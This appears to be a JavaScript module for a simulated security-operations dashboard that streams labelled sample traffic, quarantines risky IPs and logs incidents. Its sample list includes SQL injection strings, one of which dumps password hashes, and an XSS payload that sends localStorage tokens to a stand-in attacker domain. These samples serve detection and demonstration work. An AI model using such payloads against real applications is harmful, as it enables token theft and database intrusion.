import { calculateShannonEntropy, inspectPayload } from './securityEngine.js';
import { getSystemMetrics } from './systemService.js';
import { db } from '../db/database.js';

const SAMPLE_BENCHMARKS = [
  { payload: "SELECT * FROM users WHERE id = 1042;", label: 'NORMAL', ip: '192.168.1.104', port: 3306 },
  { payload: "GET /api/v1/telemetry/health HTTP/1.1", label: 'NORMAL', ip: '10.0.0.15', port: 443 },
  { payload: "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --", label: 'SQLI', ip: '45.33.32.156', port: 3306 },
  { payload: "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>", label: 'XSS', ip: '185.220.101.5', port: 443 },
  { payload: "POST /auth/login HTTP/1.1 Bearer eyJhbGciOi...", label: 'NORMAL', ip: '172.16.0.42', port: 443 },
  { payload: "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users", label: 'SQLI', ip: '45.33.32.156', port: 3306 },
  { payload: "SYN_FLOOD_BURST: 120000 pkts/s target:80", label: 'DDOS', ip: '103.145.13.2', port: 80 },
  { payload: "<img src=x onerror=alert(document.domain)>", label: 'XSS', ip: '185.220.101.5', port: 8080 },
  { payload: "DNS Query: soc.sentinel.internal.defense.gov IN A", label: 'NORMAL', ip: '10.0.0.1', port: 53 },
  { payload: "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison", label: 'POISONING', ip: '91.240.118.17', port: 9092 }
];

class PacketStreamManager {
  constructor() {
    this.wsClients = new Set();
    this.packets = [];
    this.streamInterval = null;
    this.isStreaming = true;
    this.seedInitialPackets();
  }

  seedInitialPackets() {
    for (let i = 0; i < 15; i++) {
      const sample = SAMPLE_BENCHMARKS[Math.floor(Math.random() * SAMPLE_BENCHMARKS.length)];
      this.packets.unshift(this.createPacket(sample.payload, sample.label, sample.ip, sample.port));
    }
  }

  createPacket(payload, forcedLabel = null, ip = null, port = null) {
    const analysis = inspectPayload(payload);
    const label = forcedLabel || analysis.threatType;
    const entropy = calculateShannonEntropy(payload);

    return {
      id: `pkt-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
      payload,
      label,
      ip: ip || (label === 'NORMAL' ? `192.168.1.${Math.floor(Math.random() * 200 + 10)}` : '45.33.32.156'),
      port: port || (Math.random() > 0.5 ? 443 : 3306),
      entropy,
      riskScore: analysis.riskScore,
      timestamp: new Date().toISOString()
    };
  }

  addClient(ws) {
    this.wsClients.add(ws);

    // Send initial snapshot
    const initialPayload = {
      type: 'INITIAL_STATE',
      packets: this.packets.slice(0, 20),
      systemMetrics: getSystemMetrics(),
      quarantinedIPs: db.get('quarantinedIPs'),
      socStatus: db.get('socStatus')
    };

    if (ws.readyState === ws.OPEN) {
      ws.send(JSON.stringify(initialPayload));
    }
  }

  removeClient(ws) {
    this.wsClients.delete(ws);
  }

  broadcast(message) {
    const payloadStr = typeof message === 'string' ? message : JSON.stringify(message);
    for (const client of this.wsClients) {
      if (client.readyState === 1) { // WebSocket.OPEN
        try {
          client.send(payloadStr);
        } catch (err) {
          this.wsClients.delete(client);
        }
      }
    }
  }

  startStreaming() {
    if (this.streamInterval) return;

    this.streamInterval = setInterval(() => {
      if (!this.isStreaming) return;

      const randomSample = SAMPLE_BENCHMARKS[Math.floor(Math.random() * SAMPLE_BENCHMARKS.length)];
      const packet = this.createPacket(randomSample.payload, randomSample.label, randomSample.ip, randomSample.port);

      this.packets.unshift(packet);
      if (this.packets.length > 50) this.packets.pop();

      // Check if threat should auto-quarantine or log
      if (packet.label !== 'NORMAL') {
        const quarantined = db.get('quarantinedIPs');
        const existing = quarantined.find(q => q.ip === packet.ip);
        if (!existing && packet.riskScore >= 75) {
          db.insert('quarantinedIPs', {
            ip: packet.ip,
            reason: `Automated Threat Quarantine: ${packet.label}`,
            time: new Date().toTimeString().slice(0, 8),
            active: true,
            hits: 1
          });
        }

        db.insert('incidentLogs', {
          id: `inc-${Date.now()}`,
          ip: packet.ip,
          type: packet.label,
          payload: packet.payload,
          time: new Date().toTimeString().slice(0, 8),
          action: 'REAL-TIME SOC INTERCEPT',
          severity: packet.riskScore > 80 ? 'CRITICAL' : 'HIGH'
        });
      }

      // Broadcast live stream
      this.broadcast({
        type: 'PACKET_STREAM',
        packet,
        systemMetrics: getSystemMetrics(),
        quarantinedCount: db.get('quarantinedIPs').length,
        incidentCount: db.get('incidentLogs').length
      });
    }, 2000);
  }

  injectAttack(type) {
    const candidates = SAMPLE_BENCHMARKS.filter(s => s.label === type);
    const chosen = candidates[Math.floor(Math.random() * candidates.length)] || SAMPLE_BENCHMARKS[2];
    const packet = this.createPacket(chosen.payload, chosen.label, chosen.ip, chosen.port);

    this.packets.unshift(packet);
    if (this.packets.length > 50) this.packets.pop();

    db.insert('incidentLogs', {
      id: `inc-${Date.now()}`,
      ip: packet.ip,
      type: packet.label,
      payload: packet.payload,
      time: new Date().toTimeString().slice(0, 8),
      action: 'SOC ATTACK INJECTION INTERCEPTED',
      severity: 'CRITICAL'
    });

    this.broadcast({
      type: 'ATTACK_INJECTED',
      packet,
      alert: `Simulated Attack [${packet.label}] Injected on IP ${packet.ip}`
    });

    return packet;
  }

  getRecentPackets() {
    return this.packets.slice(0, 25);
  }
}

export const packetStreamManager = new PacketStreamManager();
